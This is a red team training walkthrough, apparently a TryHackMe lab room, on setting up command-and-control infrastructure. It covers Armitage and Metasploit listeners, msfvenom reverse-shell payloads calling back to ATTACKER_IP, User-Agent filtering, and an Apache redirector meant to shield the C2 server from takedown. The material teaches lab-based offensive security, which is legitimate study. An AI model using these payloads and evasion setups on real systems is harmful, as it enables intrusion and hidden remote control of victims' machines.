### Sliver[Sliver](https://github.com/BishopFox/sliver) by [Bishop Fox](https://bishopfox.com/) is an advanced, highly customizable multi-user, CLI-based C2 framework. Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. It supports various protocols for
C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more.
Additionally, it supports BOF files for additional functionality, DNS
Canary Domains for masking C2 communications, automatic Let's Encrypt
certificate generation for HTTPS beacons, and much more. ﻿*A Screenshot of the Sliver UI*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/9447257966d025c8927541a7adab9113.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/9447257966d025c8927541a7adab9113.png)

### Paid C2 Frameworks

**Cobalt Strike**

[Cobalt Strike](https://www.cobaltstrike.com/) by Help Systems (Formerly created by Raphael Mudge) is arguably one of the most famous Command and Control frameworks next to Metasploit.
 Much like Artimage, it is written in Java and designed to be as 
flexible as possible.  For more information, see Cobalt Strike’s [Video Training Page](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ). It offers additional insight into both Red Team Operations and the Framework by Raphael Mudge himself.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/573e8581dd1be594cf674cbf06271cde.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/573e8581dd1be594cf674cbf06271cde.png)

*A screenshot of the Cobalt Strike UI*

**Brute Ratel**

[Brute Ratel](https://bruteratel.com/) by Chetan 
Nayak or Paranoid Ninja is a Command and Control framework marketed as a
 “Customizable Command and Control Center” or “C4” framework that 
provides a true adversary simulation-like experience with being a unique
 C2 framework. For more information about the Framework, the author has provided a [Video Training Page](https://bruteratel.com/tabs/tutorials/) that demonstrates many of the capabilities within the framework.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4afab434ea1d36584a5f7d0d7b8c2ad1.jpeg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4afab434ea1d36584a5f7d0d7b8c2ad1.jpeg)

*Screenshot of the Brute Ratel UI - Source:* [https://bruteratel.com/](https://bruteratel.com/)

### Other C2 Frameworks

For a more comprehensive list of C2 Frameworks and their capabilities, check out the “[C2 Matrix](https://howto.thec2matrix.com/)”, a project maintained by **Jorge Orchilles** and **Bryson Bort**. It has a far more comprehensive list of almost all C2
 Frameworks that are currently available. We highly recommend that after
 this room, you go check it out and explore some of the other C2 
Frameworks that were not discussed in this room.

### Let's Setup a C2 Server

In order to gain a better understanding of what is required to set up and administer a C2
 server, we will be using Armitage. As a reminder, Armitage is a GUI for
 the Metasploit Framework, and because of this, it has almost all 
aspects of a standard C2 framework.

*Note: In case you're using the AttackBox, you may skip to the Preparing our Environment section.*

### Setting Up Armitage

**Downloading, Building, and Installing Armitage**

First, we must clone the repository from Gitlab:

**Installing Armitage
        

           `root@kali$ git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitageCloning into 'armitage'...
remote: Enumerating objects: 760, done.
remote: Counting objects: 100% (160/160), done.
remote: Compressing objects: 100% (100/100), done.
remote: Total 760 (delta 55), reused 152 (delta 54), pack-reused 600
Receiving objects: 100% (760/760), 11.81 MiB | 8.55 MiB/s, done.
Resolving deltas: 100% (244/244), done.`**

Next up, we must build the current release; we can do so with the following command:

**Building Armitage
        

           `root@kali$ bash package.sh+ ./gradlew assemble

> Task :armitage:compileJava
Note: Some input files use or override a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
Note: Some input files use unchecked or unsafe operations.
Note: Recompile with -Xlint:unchecked for details.

Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0.
Use '--warning-mode all' to show the individual deprecation warnings.
See https://docs.gradle.org/6.8/userguide/command_line_interface.html#sec:command_line_warnings

BUILD SUCCESSFUL in 12s
6 actionable tasks: 6 executed
+ for i in unix windows mac
+ '[' unix == mac ']'
+ mkdir -p release/unix
+ cp build.txt license.txt readme.txt whatsnew.txt release/unix
+ cp build/armitage.jar build/cortana.jar release/unix
+ cp -r dist/unix/armitage dist/unix/armitage-logo.png dist/unix/teamserver release/unix
+ '[' unix == mac ']'
+ for i in unix windows mac
+ '[' windows == mac ']'
+ mkdir -p release/windows
+ cp build.txt license.txt readme.txt whatsnew.txt release/windows
+ cp build/armitage.jar build/cortana.jar release/windows
+ cp -r dist/windows/armitage.exe release/windows
+ '[' windows == mac ']'
+ for i in unix windows mac
+ '[' mac == mac ']'
++ uname
+ '[' Linux '!=' Darwin ']'
+ echo 'Skipping macOS build because this is not running on Darwin'
Skipping macOS build because this is not running on Darwin`**

After the building 
process finishes, the release build will be in the ./releases/unix/ 
folder.  You should check and verify that Armitage was able to be built 
successfully.

**Verifying Build
        

           `root@kali$ cd ./release/unix/ && ls -latotal 11000
drwxr-xr-x 2 root root    4096 Feb  6 20:20 .
drwxr-xr-x 4 root root    4096 Feb  6 20:20 ..
-rwxr-xr-x 1 root root      75 Feb  6 20:20 armitage
-rw-r--r-- 1 root root 4334705 Feb  6 20:20 armitage.jar
-rw-r--r-- 1 root root   25985 Feb  6 20:20 armitage-logo.png
-rw-r--r-- 1 root root     282 Feb  6 20:20 build.txt
-rw-r--r-- 1 root root 6778470 Feb  6 20:20 cortana.jar
-rw-r--r-- 1 root root    1491 Feb  6 20:20 license.txt
-rw-r--r-- 1 root root    4385 Feb  6 20:20 readme.txt
-rwxr-xr-x 1 root root    2665 Feb  6 20:20 teamserver
-rw-r--r-- 1 root root   85945 Feb  6 20:20 whatsnew.txt`**

In this folder, there are two key files that we will be using:

**Teamserver -**

This
 is the file that will start the Armitage server that multiple users 
will be able to connect to. This file takes two arguments:

- IP Address

Your fellow Red Team Operators will use the IP Address to connect to your Armitage server.

- Shared Password

Your fellow Red Team Operators will use the Shared Password to access your Armitage server.

**Armitage -**

This
 is the file you will be using to connect to the Armitage Teamserver. 
Upon executing the binary, a new prompt will open up, displaying 
connection information and your username (this should be treated as a 
nickname, not a username for authentication) and password.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/628edce404a27f170a34d3a9d9464d1c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/628edce404a27f170a34d3a9d9464d1c.png)

*Armitage's Connection Info GUI*

### Preparing our Environment

Before we can launch Armitage, we must do a few pre-flight checks to ensure Metasploit
 is configured properly. Armitage relies heavily on Metasploit's 
Database functionality, so we must start and initialize the database 
before launching Armitage. In order to do so, we must execute the 
following commands:

**Starting PostgreSQL

           `root@kali$ systemctl start postgresql && systemctl status postgresqlpostgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
   Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago
  Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 1587 (code=exited, status=0/SUCCESS)

Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Starting PostgreSQL RDBMS...
Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Started PostgreSQL RDBMS.`**

Lastly, we must initialize the Database so that Metasploit can use it. It's important to note that you **cannot** be the root user when attempting to initialize the Metasploit Database. On the **AttackBox,** you must use the **Ubuntu** user.

**Initializing PostgreSQL Database**

```
user@kali$ msfdb --use-defaults deleteStopping database at /home/ubuntu/.msf4/db
Deleting all data at /home/ubuntu/.msf4/db
MSF web service is no longer running

user@kali$ msfdb --use-defaults initCreating database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating database users
Writing client authentication configuration file /home/ubuntu/.msf4/db/pg_hba.conf
Stopping database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating initial database schema
Generating SSL key and certificate for MSF web service
Attempting to start MSF web service...failed
[!] MSF web service does not appear to be started.
Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.

```

After initialization is completed, we can finally start the Armitage Team Server.

### Starting and Connecting to Armitage

**Starting Armitage's Team Server**

```
root@kali$ cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123[*] Generating X509 certificate and keystore (for SSL)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...
[*] MSGRPC backgrounding at 2022-02-06 17:47:08 -0500...
[*] MSGRPC background PID 2083
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Use the following connection details to connect your clients:
        Host: 127.0.0.2
        Port: 55553
        User: msf
        Pass: P@ssw0rd123

[*] Fingerprint (check for this string when you connect):
        d211e51c8886113433f63b588fd5ccfc9e323059
[+] hacking is such a lonely thing, until now

```

Once your Teamserver is up and running, we can now start the Armitage 
client. This is used to connect to the Teamserver and displays the GUI 
to the user.

**Starting Armitage**

```
root@kali$ cd /opt/armitage/release/unix && ./armitage[*] Used the incumbent: 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Creating a default reverse handler... 0.0.0.0:8836

```

When operating a C2
 Framework, you never want to expose the management interface publicly; 
You should always listen on a local interface, never a public-facing 
one. This complicates access for fellow operators. Fortunately, there is
 an easy solution for this. For operators to gain access to the server, 
you should create a new user account for them and enable SSH access on 
the server, and they will be able to SSH port forward TCP/55553.  
Armitage **explicitly denies** users listening on 127.0.0.1; this is because it is essentially a shared Metasploit
 server with a "Deconfliction Server" that when multiple users are 
connecting to the server, you're not seeing everything that your other 
users are seeing. With Armitage, you must listen on your tun0/eth0 IP 
Address.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/250523e0ea93b10e42c3515c6b812609.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/250523e0ea93b10e42c3515c6b812609.png)

*Modify the Host IP Address to whatever you set in the previous step, "Starting Armitage's Team Server".*

After
 clicking "Connect", you will be prompted to enter a nickname. You can 
set this to whatever you like; only your fellow Red Team Operators will 
see it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/67465eb4ae28c1f7d57452b6b632314c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/67465eb4ae28c1f7d57452b6b632314c.png)

*Armitage's UI to put in a custom nickname*

After
 a moment or two, the Armitage UI should open up, until we start 
interacting with remote systems; it will look bare. In the next upcoming
 task, we will be exploiting a vulnerable virtual machine to get you 
more accustomed to the Armitage UI and how it can be used.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/fca62d124845af393a71e38e9eb94edb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/fca62d124845af393a71e38e9eb94edb.png)

*The Armitage UI*

Now
 that Armitage is set up and working correctly, in the next task, we 
will learn more about securely accessing Armitage (as described above), 
creating listeners, various listener types, generating payloads, and 
much more!

**C2 Operation Basics**

### Accessing and Managing your C2 Infrastructure

Now that we have a general idea of how to set up a C2
 Server, we will go over some basic operational details that you should 
know when accessing your C2 Server. It's important to note that you are **not** required
 to perform any actions in this task - This is meant to gain general 
experience and familiarity with Command and Control Frameworks.

Basic Operational Security

We briefly touched on this in the last section; You should never have your C2
 management interface directly accessible. This is primarily for you to 
improve operational security. It can be incredibly easy to fingerprint 
C2 servers. For example, in versions prior to 3.13, Cobalt Strike C2 
servers were able to be identified by an extra space (\x20) at the end 
of the HTTP Response. Using this tactic, many Blue Teamers could 
fingerprint all of the Cobalt Strike C2 servers publicly accessible. For
 more information on fingerprinting and identifying Cobalt Strike C2 
Servers, check out this posted on the [Recorded Future blog](https://www.recordedfuture.com/cobalt-strike-servers/).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png)

*Screenshot from a Hex Editor depicting the extra space at the end of an HTTP Response*

The
 point in mentioning this is that you want to reduce your operational 
security risk as much as possible. If this means not having the 
management interface for your C2 server publicly accessible, then, by all means, you should do it.

Accessing your Remote C2 Server that's Listening Locally

This section will be focusing on how to securely access your C2
 server by SSH port-forwarding; if you have port-forwarded with SSH 
before, feel free to skip over this section, you may not learn anything 
new. For those unfamiliar, SSH port-forwarding allows us to either host 
resources on a remote machine by forwarding a local port to the remote 
server, or allows us to access local resources on the remote machine we 
are connecting to.  In some circumstances, this may be for circumventing
 Firewalls.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/bc96eabae5235e893e22417d2cc2301f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/bc96eabae5235e893e22417d2cc2301f.png)

*Firewall Blocks TCP/8080*

Or, in our instance, this could be done for operational security reasons.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7edda600836d41987311316908354439.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7edda600836d41987311316908354439.png)

*Firewall Allows TCP/22, allowing us to access TCP/8080 over TCP/22*

Now that we have a better understanding of why we want to SSH port forward, let's go over the how.

In our C2
 set up from Task 4, our Teamserver is listening on localhost on 
TCP/55553. In order to access Remote port 55553, we must set up a Local 
port-forward to forward our local port to the remote Teamserver server. 
We can do this with the -L flag on our SSH client:

SSH Port Forward

```
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44root@kali$ echo "Connected" Connected
```

```
Now that we have anSSH remote port forward set up, you can now connect to your C2 server running on TCP/55553. As a reminder, Armitage doesnotsupport listening on a loopback interface (127.0.0.1-127.255.255.255), so this is generalC2 server admin advice. You will find this advice more centric to C2 servers like Covenant, Empire, and many others.
```

We highly recommend putting firewall rules in place for

C2

servers that must listen on a public interface so only the intended users can access your

C2

server. There are various ways to do this. If you are hosting Cloud 
infrastructure, you can set up a Security Group or use a host-based 
firewall solution like UFW or IPTables.

```
Creating a Listener in Armitage
```

Next, we're going to move onto a topic that all

C2

servers have - this being listener creation. To stay on topic, we will 
demonstrate how to set up a basic listener with Armitage then explore 
some of the other theoretical listeners you may encounter in various 
other C2 Frameworks. Let's create a basic

Meterpreter

Listener running on TCP/31337. To start, click on the Armitage dropdown
 and go over to the "Listeners" section; you should see three options, 
Bind, Reverse, and set LHOST. Bind refers to Bind Shells; you must 
connect to these hosts. Reverse refers to standard Reverse Shells; this 
is the option we will be using.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1ad92c6b503433e43a906c0d6719f137.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1ad92c6b503433e43a906c0d6719f137.png)

*Creating a Listener in Armitage*

After
 clicking "Reverse," a new menu will open up, prompting you to configure
 some basic details about the listener, specifically what port you want 
to listen on and what listener type you would like to select. There are 
two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/f1799890a05592fcc5338efd4edf281b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/f1799890a05592fcc5338efd4edf281b.png)

*Configuring the Listener*

After
 pressing enter, a new pane will open up, confirming that your listener 
has been created. This should look like the standard Metasploit exploit/multi/handler module.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7bc806ea13495e55eb82fc5c399d8876.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7bc806ea13495e55eb82fc5c399d8876.png)

*Listener successfully configured*

After
 setting up a listener, you can generate a standard 
windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the
 LHOST to the Armitage server to receive callbacks to our Armitage 
server.

**Getting a Callback**

MSFVenom Payload Generation

```
root@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

After generating the windows/meterpreter/reverse_tcp using 
MSFVenom, we can transfer the payload to a target machine and execute 
it. After a moment or two, you should receive a callback from the 
machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1dcc8962d5a595690a9b5ea9c4888dad.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1dcc8962d5a595690a9b5ea9c4888dad.png)

*Callback from the Victim*

# Listener Type

As
 previously mentioned, standard reverse shell listeners are not the only
 ones that exist; there are many varieties that use many different 
protocols; however, there are a few common ones that we will cover, 
these being the following:

**Standard Listener -**

These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.

**HTTP/HTTPS Listeners -**

These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2
 profiles to mask a C2 server. When specifically communicating over 
HTTPS, it's less likely for communications to be blocked by an NGFW. 
Metasploit has full support for HTTP/HTTPS listeners.

**DNS Listener -**

DNS
 Listeners are a popular technique specifically used in the exfiltration
 stage where additional infrastructure is normally required to be set 
up, or at the very least, a Domain Name must be purchased and 
registered, and a public NS server must be configured. It is possible to
 set up DNS C2 operations in Metasploit with the help of additional 
tools. For more information, see this "[Meterpreter over DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.

**SMB Listener -**

Communicating via SMB
 named pipes is a popular method of choice, especially when dealing with
 a restricted network; it often enables more flexible pivoting with 
multiple devices talking to each other and only one device reaching back
 out over a more common protocol like HTTP/HTTPS. Metasploit has support
 for Named Pipes.

**Advanced C2 Setups**

### There's Always Room for Improvement

As you may have guessed, Metasploit
 itself is not that great of a C2 server for advanced adversary 
operations. It's not as flexible as one would desire; you cannot 
configure agents to beacon out every X seconds with Y jitter. A 
Next-Generation Firewall could quickly pick up on this C2 traffic, 
seeing it's a constant stream of traffic. In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.

**Command and Control Redirectors**

**What is a Redirector?**

Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. It's a server that "Redirects" HTTP/HTTPS
 requests based on information within the HTTP Request body. In 
production systems, you may see a "Redirector" in the form of a Load 
Balancer. This server often runs Apache 2 or NGINX. For this lab, we 
will be leveraging Apache and some of its modules to build a Redirector.

Jumping back into Metasploit,
 we can set up some basic configurations on Metasploit to allow for more
 advanced configurations, in this task; we will be setting up a 
Redirector. Usually, this configuration is set up on multiple hosts; the
 purpose of this is to hide the true Command and Control server. The 
diagram below illustrates how communications between a victim and a C2 
server happen.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c38457eb8f35b56a630d1e1b9f2bc75f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c38457eb8f35b56a630d1e1b9f2bc75f.png)

*Illustration of a C2 and Redirector with victims calling back*

Usually, when you have a C2
 callback, you may set the callback host to a Domain, let's say 
admin.tryhackme.com. It's very common for your C2 Server to get 
reported, when a user files a complaint. Usually, the server gets taken 
down fairly quickly. It can sometimes be as little as 3 hours and as 
much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound.

But how does this stop the C2
 Server from being taken down? Surely if someone fingerprinted Cobalt 
Strike on your C2 Server, someone would file a complaint, and it would 
get taken down. This is true, so you should set up a Firewall to only 
allow communication to and from your redirector(s) to mitigate any 
potential risks.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/3ac046c94e8d8be64015641690f5e8a7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/3ac046c94e8d8be64015641690f5e8a7.png)

*Illustration of how a C2 Server and a Redirector should interact*

**How is a Redirector Setup?**

Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit
 and Apache2. In Apache, we will be leveraging a module called 
"mod_rewrite" (or the Rewrite module). This module allows us to write 
rules to forward requests to internal or external hosts on a server 
based on specific HTTP headers or content. We will need to use several 
modules to configure our Redirector. The following modules must be 
enabled:

- rewrite
- proxy
- proxy_http
- headers

*Note: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in /etc/apache2/ports.conf. You must do this before starting the Apache 2 service, or it will fail to start.*

You can install apache 2 and enable it with the following commands:

**Enabling Modules and Starting Apache2
        

           `root@kali$ apt install apache2Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
  python-slowaes python-webencodings python-xlsxwriter
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
Suggested packages:
  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
The following NEW packages will be installed
  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.

Processing triggers for systemd (237-3ubuntu10.42) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
Processing triggers for ufw (0.36-0ubuntu0.18.04.1) ...
Processing triggers for ureadahead (0.100.0-21) ...

root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy_http.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2

● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 4153 (apache2)
      Tasks: 1 (limit: 19072)
     Memory: 6.0M
        CPU: 19ms
     CGroup: /system.slice/apache2.service
             └─4153 /usr/sbin/apache2 -k start`**

Using Meterpreter,
 we have the ability to configure various aspects of the HTTP Request, 
for example, the User-Agent. It is very common for a threat actor to 
make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS 
payloads. It's in every HTTP request, and they all more or less look the
 same, and there is a very good chance a security analyst may overlook a
 modified user agent string. For this demonstration, we will generate a 
Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect 
the HTTP request in Wireshark.

**Generating a Payload with Modified Headers -**

**Generating a Modified HTTP Payload with Meterpreter**

```
root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 454 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the `HTTP` filter to only view HTTP
 requests. After it's started capturing packets, execute the binary on 
the victim system. You will notice an HTTP request come in with our 
modified User-Agent.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/b842ee1430892fa04c092531b9383f4f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/b842ee1430892fa04c092531b9383f4f.png)

*Packet Capture of the modified HTTP Payload with Meterpreter*

Now that we have a field we can control in the HTTP
 Request, let's create an Apache2 mod_rewrite rule that filters on the 
user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.

Modifying the Apache Config File -

This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found at `/etc/apache2/sites-available/000-default.conf`.

**Default Apache2 Config**

```
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        <Directory>
                AllowOverride All
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined</VirtualHost>

```

Now that we have a general idea of the Apache2
 Config file is structured, we must add a few lines to the config file 
to enable the Rewrite Engine, add a rewrite condition, and lastly, pass 
through the Apache 2 Proxy. This sounds fairly complex, but it's quite 
simple.

To enable the [Rewrite Engine](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html), we must add `RewriteEngine On` onto a new line in the VirtualHost section.

Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see the [mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)
 on Apache.org. Because we only want to match the User-Agent 
"NotMeterpreter", we need to use some basic Regular Expressions to 
capture this; adding a ^ signals the beginning of a string and a $ at 
the end of the series, giving us with "^NotMeterpreter$". This Regex 
will **only** capture the NotMeterpreter User-Agent. We can add this line `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.

Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache's [mod_proxy module](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. This **will** vary from setup to set up, but this IP Address will be your C2
 server. In the lab scenario, it will be localhost and port that 
Metasploit is listening on. This will give us a full config file that 
looks like so:

**Modified Apache2 Config**

```
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

**Setting Up Exploit/Multi/Handler**

To set up Meterpreter
 properly, we need to make a few modifications; We must set our LHOST 
argument to the incoming interface that we are expecting connections 
from, in our lab; this will be 127.0.0.1. In the real world, this will 
be your public interface that your Redirector will be connecting to (aka
 your Public IP Address), and the LPORT will be whatever you like. For 
the lab, we will be using TCP/8080; this can be whatever you like in 
production. As always, the best practice is to run services over their 
standard protocols, so HTTP should run on port 80, and HTTPS should run 
on port 443. These options will also need to be duplicated for 
ReverseListenerBindAddress and ReverseListenerBindPort.

Next,
 we need to set up OverrideLHOST - This value will be your redirector's 
IP Address or Domain Name. After that, we need to set the OverrideLPORT;
 this will be the port that the HTTP *or* HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter
 respond with the OverrideHost information, so all queries go through 
the Redirector and not your C2 server. Now that you understand what must
 be configured, let's dive into it:

**Metasploit Redirector**

```
root@kali$ msfconsolemsf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
ReverseListenerBindPort => 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
OverrideLHOST => 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
OverrideLPORT => 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
HttpUserAgent => NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
OverrideRequestHost => true
msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:8080
[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500

```

After this has all been set up, running your Meterpreter
 Reverse Shell should now proxy all communications through your 
Redirector! For awareness, the diagram below is how our Redirector is 
set up in our lab; as a reminder, in engagements, you will want to use **multiple** hosts and DNS records instead of IP Addresses.

